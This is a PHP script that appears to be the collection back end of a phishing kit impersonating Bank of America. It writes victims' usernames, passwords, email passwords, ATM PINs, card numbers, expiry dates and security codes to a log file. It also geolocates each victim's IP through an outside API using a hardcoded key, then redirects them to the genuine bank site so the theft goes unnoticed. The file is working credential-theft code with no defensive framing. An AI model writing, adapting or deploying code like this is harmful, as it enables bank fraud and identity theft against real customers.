<?php
session_start();


@$fhandlr = fopen($_SESSION['FN'], "a");

@fwrite($fhandlr, "***********************************************\n");
@fwrite($fhandlr, 'U: '.$_SESSION['U1']."\n");
@fwrite($fhandlr, 'P: '.$_SESSION['P1']."\n");
@fwrite($fhandlr, 'E: '.$_SESSION['E1']."\n");
@fwrite($fhandlr, 'EP: '.$_SESSION['EP1']."\n");
@fwrite($fhandlr, 'AT-M: '.$_SESSION['AT1']."\n");
@fwrite($fhandlr, 'Cnum: '.$_SESSION['cn']."\n");
@fwrite($fhandlr, 'Cexp: '.$_SESSION['cm'].'/'.$_SESSION['ca']."\n");
@fwrite($fhandlr, 'Ccod: '.$_SESSION['co']."\n");
@fwrite($fhandlr, 'TPID: '.$_POST['ipts10']."\n");
@fwrite($fhandlr, 'NMID: '.$_POST['ipts11']."\n");




if( !empty($_SERVER['REMOTE_ADDR']) ){

    @$api_url = "http://api.ipinfodb.com/v3/ip-city/?key=9878000ae447eadf64046ddbbf3d8588bce21329f0a5882bdfb8c4fc8c0a3fbf&ip=".$_SERVER['REMOTE_ADDR'];
    @$IPResult =  file_get_contents($api_url);
    @fwrite($fhandlr, 'IP: '.$_SERVER['REMOTE_ADDR']."\n");
    @fwrite($fhandlr, 'LC: '.$IPResult."\n");

}elseif( !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ){

    @$api_url = "http://api.ipinfodb.com/v3/ip-city/?key=9878000ae447eadf64046ddbbf3d8588bce21329f0a5882bdfb8c4fc8c0a3fbf&ip=".$_SERVER['HTTP_X_FORWARDED_FOR'];
    @$IPResult =  file_get_contents($api_url);
    @fwrite($fhandlr, 'IP: '.$_SERVER['HTTP_X_FORWARDED_FOR']."\n");
    @fwrite($fhandlr, 'LC: '.$IPResult."\n");

}else{
    fwrite($fhandlr, 'IP1: '.$_SERVER['REMOTE_ADDR']."\n");
    fwrite($fhandlr, 'IP2: '.$_SERVER['HTTP_X_FORWARDED_FOR']."\n");
}

fwrite($fhandlr, 'Date: '. date("d-m-Y")."\n");
fclose($fhandlr);
session_destroy();
header ('Location:https://www.bankofamerica.com/es/');
?>